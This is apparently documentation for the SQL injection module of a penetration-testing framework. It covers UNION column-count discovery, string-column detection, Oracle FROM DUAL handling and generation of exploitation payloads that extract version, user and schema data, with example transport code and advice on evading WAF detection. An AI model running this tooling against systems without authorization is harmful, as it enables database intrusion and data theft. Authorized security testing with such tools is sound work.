# SQL Fingerprinter Module

## Overview

The SQL Fingerprinter module provides automated discovery of UNION-based SQL injection parameters through systematic column count detection and string-type column identification. This module is designed to work within the Megido SQL attacker framework and supports multiple database types including Oracle's FROM DUAL requirement.

## Features

### ✨ Core Capabilities

- **Automated Column Count Discovery**: Systematically tests UNION SELECT with increasing NULL columns to find the correct column count
- **String Column Detection**: Identifies which columns can accept string values by injecting marker strings
- **Oracle Support**: Automatically appends `FROM DUAL` when Oracle database is detected
- **Database Type Detection**: Identifies database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) from error messages
- **Pluggable Transport**: Abstract HTTP request handling for integration with CLI or GUI tools
- **Success Detection**: Multiple heuristics for detecting successful injection (error disappearance, marker presence, response changes)
- **Exploitation Payload Generation**: Creates ready-to-use UNION payloads for data extraction

### 🎯 Use Cases

1. **Security Testing**: Automated testing of web applications for UNION-based SQL injection
2. **Penetration Testing**: Quick identification of exploitable SQL injection points
3. **Bug Bounty Hunting**: Efficient discovery of injection parameters
4. **Security Research**: Study SQL injection behavior across different databases

## Installation

The module is part of the Megido SQL attacker package:

```python
from sql_attacker import SqlFingerprinter, DatabaseType, FingerprintResult
```

## Quick Start

### Basic Usage

```python
from sql_attacker import SqlFingerprinter
import requests

def send_payload(payload):
    """Send payload to vulnerable endpoint"""
    response = requests.get(f"http://example.com/page?id={payload}")
    return {
        'status_code': response.status_code,
        'content': response.text,
        'length': len(response.text)
    }

# Initialize fingerprinter
fingerprinter = SqlFingerprinter(send_payload, verbose=True)

# Perform full fingerprinting
result = fingerprinter.full_fingerprint(max_columns=20)

if result.success:
    print(f"Column count: {result.column_count}")
    print(f"String columns: {result.string_columns}")
    
    # Generate exploitation payloads
    payloads = fingerprinter.generate_exploitation_payloads(
        column_count=result.column_count,
        string_columns=result.string_columns
    )
    
    for payload in payloads:
        print(payload)
```

## API Reference

### SqlFingerprinter Class

#### `__init__(transport_function, verbose=True, delay=0.0, database_type=None)`

Initialize the SQL fingerprinter.

**Parameters:**
- `transport_function` (Callable): Function that accepts a payload string and returns a dict with keys: `status_code`, `content`, `length`
- `verbose` (bool): Enable verbose logging (default: True)
- `delay` (float): Delay between requests in seconds for rate limiting (default: 0.0)
- `database_type` (DatabaseType, optional): Pre-set database type or None for auto-detection

**Example:**
```python
from sql_attacker import SqlFingerprinter, DatabaseType

fingerprinter = SqlFingerprinter(
    transport_function=send_payload,
    verbose=True,
    delay=0.5,  # 500ms delay between requests
    database_type=DatabaseType.ORACLE
)
```

#### `discover_column_count(max_columns=20, start_columns=1)`

Discover the number of columns required for UNION-based injection.

**Parameters:**
- `max_columns` (int): Maximum number of columns to test (default: 20)
- `start_columns` (int): Starting number of columns to test (default: 1)

**Returns:**
- `FingerprintResult` object with `success` and `column_count` attributes

**Example:**
```python
result = fingerprinter.discover_column_count(max_columns=15)
if result.success:
    print(f"Found {result.column_count} columns")
```

#### `discover_string_columns(column_count, marker="'SQLFingerprint'")`

Discover which columns accept string values.

**Parameters:**
- `column_count` (int): Number of columns (from discover_column_count)
- `marker` (str): String marker to test with (default: `'SQLFingerprint'`)

**Returns:**
- `FingerprintResult` object with `success` and `string_columns` attributes (list of 0-indexed column positions)

**Example:**
```python
result = fingerprinter.discover_string_columns(
    column_count=3,
    marker="'TestMarker'"
)
if result.success:
    print(f"String columns: {result.string_columns}")
```

#### `full_fingerprint(max_columns=20, marker="'SQLFingerprint'")`

Perform complete fingerprinting: column count + string column discovery.

**Parameters:**
- `max_columns` (int): Maximum number of columns to test (default: 20)
- `marker` (str): String marker for detection (default: `'SQLFingerprint'`)

**Returns:**
- `FingerprintResult` object with both `column_count` and `string_columns`

**Example:**
```python
result = fingerprinter.full_fingerprint(max_columns=10)
print(fingerprinter.format_report(result))
```

#### `generate_exploitation_payloads(column_count, string_columns, data_to_extract=None)`

Generate exploitation payloads based on fingerprinting results.

**Parameters:**
- `column_count` (int): Number of columns
- `string_columns` (List[int]): List of string-capable column indices (0-indexed)
- `data_to_extract` (List[str], optional): SQL expressions to extract (e.g., `['@@version', 'user()']`)

**Returns:**
- List of exploitation payloads

**Example:**
```python
payloads = fingerprinter.generate_exploitation_payloads(
    column_count=3,
    string_columns=[1],
    data_to_extract=['@@version', 'database()', 'user()']
)
```

#### `format_report(result)`

Format fingerprinting result as a human-readable report.

**Parameters:**
- `result` (FingerprintResult): Fingerprinting result to format

**Returns:**
- Formatted report string

### FingerprintResult Class

A dataclass containing fingerprinting results:

**Attributes:**
- `success` (bool): Whether fingerprinting was successful
- `column_count` (int, optional): Number of columns discovered
- `string_columns` (List[int], optional): 0-indexed positions of string-capable columns
- `database_type` (DatabaseType, optional): Detected database type
- `confidence` (float): Confidence score (0.0-1.0)
- `method` (str): Method used for fingerprinting
- `details` (Dict): Additional details about the operation

### DatabaseType Enum

Supported database types:
- `DatabaseType.MYSQL`
- `DatabaseType.POSTGRESQL`
- `DatabaseType.MSSQL`
- `DatabaseType.ORACLE`
- `DatabaseType.SQLITE`
- `DatabaseType.UNKNOWN`

## Advanced Usage

### Oracle Database Handling

Oracle databases require `FROM DUAL` clause in UNION statements. The fingerprinter automatically handles this:

```python
# Automatic detection from error messages
fingerprinter = SqlFingerprinter(send_payload, verbose=True)
# Will auto-detect Oracle and append FROM DUAL

# Or explicitly set database type
fingerprinter = SqlFingerprinter(
    send_payload,
    database_type=DatabaseType.ORACLE
)

# Payload automatically includes FROM DUAL
payload = fingerprinter._build_union_payload(3)
# Result: ' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

### Custom Transport Functions

The transport function can integrate with any HTTP library:

#### Using requests library:
```python
import requests

def requests_transport(payload):
    response = requests.get(
        "http://example.com/page",
        params={'id': payload},
        timeout=10
    )
    return {
        'status_code': response.status_code,
        'content': response.text,
        'length': len(response.text)
    }
```

#### Using urllib:
```python
import urllib.request
import urllib.parse

def urllib_transport(payload):
    url = f"http://example.com/page?id={urllib.parse.quote(payload)}"
    response = urllib.request.urlopen(url)
    content = response.read().decode('utf-8')
    return {
        'status_code': response.status,
        'content': content,
        'length': len(content)
    }
```

#### With custom headers:
```python
def authenticated_transport(payload):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Cookie': 'session=abc123',
        'Authorization': 'Bearer token123'
    }
    response = requests.get(
        f"http://example.com/page?id={payload}",
        headers=headers
    )
    return {
        'status_code': response.status_code,
        'content': response.text,
        'length': len(response.text)
    }
```

### Rate Limiting

To avoid triggering WAF or rate limits:

```python
fingerprinter = SqlFingerprinter(
    send_payload,
    delay=1.0  # 1 second delay between requests
)
```

### Custom Marker Strings

Use custom markers to avoid detection:

```python
result = fingerprinter.discover_string_columns(
    column_count=3,
    marker="'Xyz123'"  # Custom marker
)
```

### Optimizing Performance

Start from a higher column count if you have prior knowledge:

```python
# If you know there are at least 3 columns
result = fingerprinter.discover_column_count(
    max_columns=10,
    start_columns=3  # Start from 3 instead of 1
)
```

## Success Detection Heuristics

The fingerprinter uses multiple methods to detect successful injection:

1. **Error Disappearance**: Error status code (500) changes to success (200)
2. **Marker Detection**: Injected string marker appears in response
3. **Response Length Change**: Significant change (5-200%) in response length
4. **Success Indicators**: Keywords like "success", "found", "results" in response
5. **Database Error Patterns**: Removal of database-specific error messages

## Integration with Megido Framework

### CLI Integration Example

```python
from sql_attacker import SqlFingerprinter
import argparse

def cli_main():
    parser = argparse.ArgumentParser(description='SQL Fingerprinter')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--param', required=True, help='Vulnerable parameter')
    parser.add_argument('--max-cols', type=int, default=20)
    args = parser.parse_args()
    
    def transport(payload):
        import requests
        params = {args.param: payload}
        response = requests.get(args.url, params=params)
        return {
            'status_code': response.status_code,
            'content': response.text,
            'length': len(response.text)
        }
    
    fingerprinter = SqlFingerprinter(transport, verbose=True)
    result = fingerprinter.full_fingerprint(max_columns=args.max_cols)
    
    print(fingerprinter.format_report(result))
    
    if result.success and result.string_columns:
        payloads = fingerprinter.generate_exploitation_payloads(
            column_count=result.column_count,
            string_columns=result.string_columns
        )
        print("\nExploitation Payloads:")
        for payload in payloads:
            print(f"  {payload}")

if __name__ == '__main__':
    cli_main()
```

## Testing

### Running Tests

```bash
# Run Django tests (requires database)
python manage.py test sql_attacker.test_sql_fingerprinter

# Run standalone tests (no database required)
python sql_attacker/test_sql_fingerprinter_standalone.py
```

### Running Demo

```bash
python sql_attacker/demo_sql_fingerprinter.py
```

## Security Considerations

⚠️ **Important Security Notes:**

1. **Authorization Required**: Only use this tool on systems you have explicit permission to test
2. **Legal Compliance**: Unauthorized access to computer systems is illegal in most jurisdictions
3. **Responsible Disclosure**: Report discovered vulnerabilities responsibly
4. **Rate Limiting**: Use delays to avoid overwhelming target systems
5. **Detection Risk**: SQL injection attempts may be logged and detected by WAF/IDS

## Troubleshooting

### Common Issues

**Issue: Column count discovery fails**
- Increase `max_columns` parameter
- Check if injection point is actually vulnerable
- Verify transport function returns correct format
- Try different injection contexts (quotes, parentheses)

**Issue: String columns not detected**
- Marker string might be filtered by application
- Try custom markers
- Check if columns are actually displayed in response
- Verify application doesn't encode HTML entities

**Issue: Oracle payloads fail**
- Ensure `FROM DUAL` is being appended
- Set `database_type=DatabaseType.ORACLE` explicitly
- Check for Oracle-specific error messages

**Issue: Too many false positives**
- Establish better baseline by testing normal responses
- Adjust success detection heuristics
- Increase confidence threshold

## Examples

### Example 1: Basic Fingerprinting

```python
from sql_attacker import SqlFingerprinter
import requests

def send_payload(payload):
    response = requests.get(f"http://testsite.com/product?id={payload}")
    return {
        'status_code': response.status_code,
        'content': response.text,
        'length': len(response.text)
    }

fingerprinter = SqlFingerprinter(send_payload)
result = fingerprinter.full_fingerprint()

if result.success:
    print(f"Columns: {result.column_count}")
    print(f"String columns: {result.string_columns}")
```

### Example 2: MySQL Database Exploitation

```python
from sql_attacker import SqlFingerprinter, DatabaseType

fingerprinter = SqlFingerprinter(
    send_payload,
    database_type=DatabaseType.MYSQL
)

result = fingerprinter.full_fingerprint()

if result.success:
    # Generate MySQL-specific payloads
    payloads = fingerprinter.generate_exploitation_payloads(
        column_count=result.column_count,
        string_columns=result.string_columns,
        data_to_extract=[
            '@@version',
            'user()',
            'database()',
            'table_name FROM information_schema.tables LIMIT 1'
        ]
    )
    
    for payload in payloads:
        response = send_payload(payload)
        print(f"Payload: {payload}")
        print(f"Response: {response['content'][:100]}")
```

### Example 3: Oracle Database with FROM DUAL

```python
from sql_attacker import SqlFingerprinter, DatabaseType

fingerprinter = SqlFingerprinter(
    send_payload,
    database_type=DatabaseType.ORACLE
)

result = fingerprinter.full_fingerprint()

if result.success:
    payloads = fingerprinter.generate_exploitation_payloads(
        column_count=result.column_count,
        string_columns=result.string_columns,
        data_to_extract=[
            'banner FROM v$version WHERE ROWNUM=1',
            'user',
            'ora_database_name'
        ]
    )
    
    # All payloads will include FROM DUAL
    for payload in payloads:
        print(payload)
```

## Contributing

Contributions are welcome! Please ensure:
- All tests pass
- Code follows existing style
- Documentation is updated
- Security best practices are followed

## License

This module is part of the Megido security framework. See main LICENSE file for details.

## Author

Megido Security Team

## Version History

- **v1.0.0** (2026-02-17): Initial release
  - Column count discovery
  - String column detection
  - Oracle FROM DUAL support
  - Database type auto-detection
  - Exploitation payload generation
